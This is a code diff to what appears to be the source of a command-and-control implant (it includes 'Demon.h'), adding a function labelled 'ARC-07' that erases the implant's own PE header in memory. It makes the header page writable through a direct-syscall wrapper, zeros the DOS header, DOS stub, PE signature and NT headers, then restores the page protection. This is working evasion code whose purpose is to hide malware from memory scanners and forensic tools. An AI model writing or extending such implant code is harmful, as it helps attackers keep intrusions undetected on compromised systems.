@@ -1,6 +1,7 @@
 #include <Demon.h>
 #include <core/Runtime.h>
 #include <core/MiniStd.h>
+#include <core/SysNative.h>
 
 
 BOOL RtAdvapi32(
@@ -503,3 +504,100 @@ BOOL RtWinHttp(
     return TRUE;
 }
 #endif
+
+/* ------------------------------------------------------------------ */
+/* ARC-07: PE header signature erasure                                 */
+/* ------------------------------------------------------------------ */
+
+/*! Size of the region to zero — one page covers the full DOS/PE header
+ *  area for any standard PE image. */
+#define PE_HEADER_PAGE_SIZE  0x1000
+
+NTSTATUS RtStompPeHeader(
+    VOID
+) {
+    PVOID              ModuleBase = NULL;
+    PIMAGE_DOS_HEADER  Dos        = NULL;
+    PVOID              Base       = NULL;
+    SIZE_T             RegionSize = PE_HEADER_PAGE_SIZE;
+    ULONG              OldProt    = 0;
+    ULONG              Dummy      = 0;
+    NTSTATUS           Status     = STATUS_SUCCESS;
+    DWORD              PeOffset   = 0;
+
+    ModuleBase = Instance->Session.ModuleBase;
+
+    if ( ! ModuleBase ) {
+        PUTS( "[ARC-07] ModuleBase is NULL — cannot erase PE header" )
+        return STATUS_INVALID_PARAMETER;
+    }
+
+    /* Grab e_lfanew before we zero anything — we need it to locate the
+     * PE signature.  Validate the DOS header is present first. */
+    Dos = (PIMAGE_DOS_HEADER) ModuleBase;
+    if ( Dos->e_magic != IMAGE_DOS_SIGNATURE ) {
+        PUTS( "[ARC-07] no MZ signature at ModuleBase — headers may already be stomped" )
+        return STATUS_SUCCESS;
+    }
+
+    PeOffset = Dos->e_lfanew;
+    if ( PeOffset <= 0 || PeOffset >= PE_HEADER_PAGE_SIZE - sizeof( DWORD ) ) {
+        PUTS( "[ARC-07] e_lfanew out of range — aborting" )
+        return STATUS_INVALID_IMAGE_FORMAT;
+    }
+
+    PRINTF( "[ARC-07] erasing PE header signatures at %p (e_lfanew = 0x%x)\n",
+            ModuleBase, PeOffset )
+
+    /* 1. Make the header page writable -------------------------------- */
+    Base = ModuleBase;
+    Status = SysNtProtectVirtualMemory(
+        NtCurrentProcess(),
+        (PVOID*) &Base,
+        &RegionSize,
+        PAGE_READWRITE,
+        &OldProt
+    );
+    if ( ! NT_SUCCESS( Status ) ) {
+        PRINTF( "[ARC-07] NtProtectVirtualMemory(RW) failed: %08x\n", Status )
+        return Status;
+    }
+
+    /* 2. Zero the DOS header (IMAGE_DOS_HEADER — includes MZ magic) --- */
+    MemZero( ModuleBase, sizeof( IMAGE_DOS_HEADER ) );
+
+    /* 3. Zero the DOS stub (bytes between IMAGE_DOS_HEADER and PE sig)  */
+    if ( PeOffset > sizeof( IMAGE_DOS_HEADER ) ) {
+        MemZero(
+            C_PTR( U_PTR( ModuleBase ) + sizeof( IMAGE_DOS_HEADER ) ),
+            PeOffset - sizeof( IMAGE_DOS_HEADER )
+        );
+    }
+
+    /* 4. Zero the PE signature (4 bytes: "PE\0\0") and the rest of the
+     *    COFF + optional header up to the end of the header page.  This
+     *    ensures the NT headers, section table, and any padding are all
+     *    erased. */
+    MemZero(
+        C_PTR( U_PTR( ModuleBase ) + PeOffset ),
+        PE_HEADER_PAGE_SIZE - PeOffset
+    );
+
+    PUTS( "[ARC-07] PE header signatures erased" )
+
+    /* 5. Restore page protection to PAGE_EXECUTE_READ ----------------- */
+    Base       = ModuleBase;
+    RegionSize = PE_HEADER_PAGE_SIZE;
+    Status = SysNtProtectVirtualMemory(
+        NtCurrentProcess(),
+        (PVOID*) &Base,
+        &RegionSize,
+        PAGE_EXECUTE_READ,
+        &Dummy
+    );
+    if ( ! NT_SUCCESS( Status ) ) {
+        PRINTF( "[ARC-07] NtProtectVirtualMemory(XR) failed: %08x\n", Status )
+    }
+
+    return STATUS_SUCCESS;
+}
